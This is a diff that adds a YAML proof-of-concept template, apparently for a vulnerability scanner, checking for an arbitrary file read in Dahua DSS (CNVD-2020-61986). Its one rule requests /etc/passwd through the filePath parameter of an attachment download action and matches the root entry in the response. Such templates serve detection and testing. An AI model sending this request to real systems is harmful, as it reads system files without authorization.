@@ -1,0 +1,19 @@
+name: yaml-poc-dahuatech-dss-readfile-CNVD-2020-61986
+binding: 090c3754-8db5-4f99-945d-74de8c6178d0
+detail:
+    author: system_user
+    links:
+        - https://forum.butian.net/share/141
+    vulnerability:
+        id: 8035966c-e154-4b00-b91d-14886769d951
+        level: medium
+transport: http
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+            follow_redirects: false
+        expression: response.status == 200 && "root:(.*):0:0:".bmatches(response.body)
+expression: r1()
